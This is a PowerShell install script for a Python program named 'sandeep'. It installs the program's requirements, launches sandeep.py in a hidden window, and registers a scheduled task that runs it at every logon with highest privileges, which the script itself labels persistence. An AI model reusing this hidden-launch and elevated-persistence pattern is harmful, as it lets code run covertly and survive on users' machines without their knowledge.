Write-Host "[+] Installing sandeep..." -ForegroundColor Green

Set-Location -Path (Split-Path -Parent $MyInvocation.MyCommand.Definition)

if (-not (Get-Command python -ErrorAction SilentlyContinue) -and -not (Get-Command python3 -ErrorAction SilentlyContinue)) {
    Write-Host "[X] Python is not installed. Please install Python 3.x" -ForegroundColor Red
    exit 1
}

Write-Host "[+] Installing Python requirements..." -ForegroundColor Yellow
python -m pip install --upgrade pip
python -m pip install -r requirements.txt

Write-Host "[+] Starting sandeep..." -ForegroundColor Yellow
Start-Process python "sandeep.py" -WindowStyle Hidden

Write-Host "[+] Setting up persistence..." -ForegroundColor Yellow
$taskName = "sandeep"
$scriptPath = Join-Path (Get-Location) "sandeep.py"
schtasks /query /tn $taskName > $null 2>&1
if ($LASTEXITCODE -ne 0) {
    schtasks /create /sc onlogon /tn $taskName /tr "python `"$scriptPath`"" /rl HIGHEST /f
}

Write-Host "[✅] sandeep is now running in the background with persistence!" -ForegroundColor Green